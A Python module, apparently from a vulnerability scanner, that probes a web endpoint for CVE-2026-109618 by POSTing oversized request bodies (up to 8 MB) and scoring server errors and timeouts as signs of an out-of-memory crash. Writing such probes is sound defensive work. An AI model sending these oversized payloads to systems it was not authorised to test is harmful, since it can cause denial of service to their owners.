# Python 3.11 · CVE-2026-109618 trigger: OOM longjmp memory-state probe
from __future__ import annotations

import asyncio

import httpx

from .base import TriggerResult, probe


class OOMTrigger:
    cve = "CVE-2026-109618"
    PAYLOAD_SIZES = (256 * 1024, 2 * 1024 * 1024, 8 * 1024 * 1024)
    SAMPLES = 3

    def __init__(self, safe: bool = True) -> None:
        self.safe = safe

    async def run(self, client: httpx.AsyncClient, url: str) -> TriggerResult:
        responses, timings, errors = [], [], []
        for size in self.PAYLOAD_SIZES:
            body = b"A" * size
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(size),
            }
            for _ in range(self.SAMPLES if not self.safe else 1):
                r, ms, err = await probe(client, "POST", url, headers=headers, body=body, timeout=20.0)
                timings.append(ms)
                if err:
                    errors.append(err)
                    responses.append(None)
                else:
                    responses.append((r.status_code, len(r.content or b"")))
                await asyncio.sleep(0.4)

        hit, confidence, evidence = self._score(responses, timings, errors)
        return TriggerResult(cve=self.cve, hit=hit, confidence=confidence, evidence=evidence, duration_ms=sum(timings))

    def _score(self, responses, timings, errors) -> tuple[bool, float, dict]:
        evidence = {"responses": responses, "timings_ms": timings, "errors": errors}
        if not timings:
            return False, 0.0, evidence
        score = 0.0
        transport_errs = sum(1 for e in errors if e in ("ReadError", "RemoteProtocolError", "ReadTimeout"))
        if transport_errs >= 2:
            score += 0.30
        five_xx = sum(1 for r in responses if r and 500 <= r[0] < 600)
        if five_xx >= 2:
            score += 0.40
        lengths = [r[1] for r in responses if r]
        if lengths and max(lengths) - min(lengths) > 64:
            score += 0.25
        four_xx = sum(1 for r in responses if r and 400 <= r[0] < 500)
        if four_xx >= len(responses) // 2:
            score -= 0.50
        score = max(0.0, min(1.0, score))
        return score >= 0.55, score, evidence